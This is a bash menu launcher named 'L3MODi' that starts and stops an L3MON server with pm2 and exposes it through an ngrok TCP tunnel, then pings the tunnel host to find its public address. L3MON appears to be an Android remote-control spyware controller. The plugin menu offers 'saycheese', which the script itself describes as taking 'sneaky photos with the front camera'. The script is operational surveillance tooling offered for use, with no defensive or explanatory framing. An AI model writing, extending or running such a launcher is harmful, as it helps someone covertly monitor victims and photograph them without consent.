bl='\e[1;34m' 
wht='\e[1;37m'
re='\e[1;31m'
grn='\e[1;32m'
del='\e[0m'
ylw='\e[1;33m'
mgt='\e[1;35m'
cyn='\e[1;36m'
ver='v1.0'
lang='EN'

function menu(){
	clear
	figlet -f pagga " L3MODi " | lolcat 
	echo -e "${wht}------[ BinIT™ - ${ver} ]----- LANGUAGE: ${cyn}${lang}"
	echo ""
	echo " "
	pm2 status
	echo ""
	echo -e "${wht}⌜----------------------------------------⌝"
	echo -e " ${grn}[1]${wht} Initialize the PM2 server     "	
	echo -e " ${grn}[2]${wht} Close the PM2 server 	       "
	echo -e " ${grn}[3]${wht} Initialize Ngrok server       "
	echo -e " ${grn}[4]${wht} Ping Ngrok TCP                "
	echo -e " ${grn}[5]${wht} Some other stuff              "
	echo -e " ${grn}[lang]${wht} Change language             "
	echo -e " ${grn}[e]${wht} Exit                          "
	echo -e "${wht}⌞----------------------------------------⌟"
	echo -ne " ${bl}[${re}L3MODi${bl}]${wht}==> "
	read req
  		case "$req" in
   		"1") srvpm2	
   		;;
   		"2") clspm2	
   		;;
   		"3") srvngrok       
   		;;
   		"4") srvping
   		;;
   		"5") plugin_list 
   		;;
   		"lang") language 
   		;;
   		"e") exip
   		;;
   		"r") res
   		;;    
     			*)
			echo -ne " ${re}[!]${wht} Invalid Input "
			read 
			menu	 
   		;;	
  		esac
}

function srvpm2(){
        clear
	figlet -f pagga " L3MODi " | lolcat 
	echo -e "${wht}------[ BinIT™ - ${ver} ]----- LANGUAGE: ${cyn}${lang}"
	echo ""
	echo " "
	pm2 start index.js
	echo ""
	echo -e " ${bl}[${grn}✔${bl}]${wht} Server started (L3MON). "
	echo -ne " ${bl}[${ylw}✍${bl}]${wht} Press any key to continue... "
	read 
	menu
}

function clspm2(){
	clear
	figlet -f pagga " L3MODi " | lolcat 
	echo -e "${wht}------[ BinIT™ - ${ver} ]----- LANGUAGE: ${cyn}${lang}"
	echo ""
	echo " "
	pm2 stop index
	echo ""
	echo -e " ${bl}[${re}✘${bl}]${wht} Server closed (L3MON). "
	echo -ne " ${bl}[${ylw}✍${bl}]${wht} Press any key to continue... "
	read 
	menu
}

function srvngrok(){
        clear
	figlet -f pagga " L3MODi " | lolcat 
	echo -e "${wht}------[ BinIT™ - ${ver} ]----- LANGUAGE: ${cyn}${lang}"
	echo ""
	echo " "
	chmod +x ngrok_srv.sh
	gnome-terminal -- ./ngrok_srv.sh 
	echo -e " ${bl}[${grn}✔${bl}]:${wht} Server started (Ngrok). "		
	echo -ne " ${bl}[${ylw}✍${bl}]${wht} Press any key to continue... "
	read 
	menu
}

function srvping(){
	clear
	figlet -f pagga " L3MODi " | lolcat 
	echo -e "${wht}------[ BinIT™ - ${ver} ]----- LANGUAGE: ${cyn}${lang}"
	echo ""
	echo " "
	echo -e " ${bl}[${re}INS${bl}]${wht} If you get the IP then Ctrl + C to exit "
	ping 0.tcp.ngrok.io
	echo -ne " ${bl}[${ylw}✍${bl}]${wht} Press any key to continue... "
	read 
	menu
}

function exip(){
	clear	
	exit
}

function res(){
	chmod +x ./en_pack.sh
	./en_pack.sh
}

function plugin_list(){
	clear 
	figlet -f pagga " L3MODi " | lolcat 
	echo -e "${wht}------[ BinIT™ - ${ver} ]----- LANGUAGE: ${cyn}${lang}"
	echo ""
	echo " "
	echo -e "${wht}⌜--------------------------------------------------------------⌝"
	echo -e " ${grn}[1]${wht} saycheese (Take sneaky photos with the front camera) "				       
	echo -e " ${grn}[e]${wht} Return to the menu "
	echo -e "${wht}⌞--------------------------------------------------------------⌟"
	echo -ne " ${bl}[${re}L3MODi${bl}]${wht}==> "
	read plugin
		case "$plugin" in
		"1") plugin1
		;;
		"e") returu
		;;
			*)
			echo -ne " ${re}[!]${wht} Invalid Input "
			read 
			plugin_list
		;;
		esac 
}

function plugin1(){
	clear
	cd plugin1
	chmod +x plugin1.sh
	./plugin1.sh
	plugin_list	
}

function returu(){
	menu
}

function language(){
	chmod +x l3mod.sh
	./l3mod.sh
}
menu
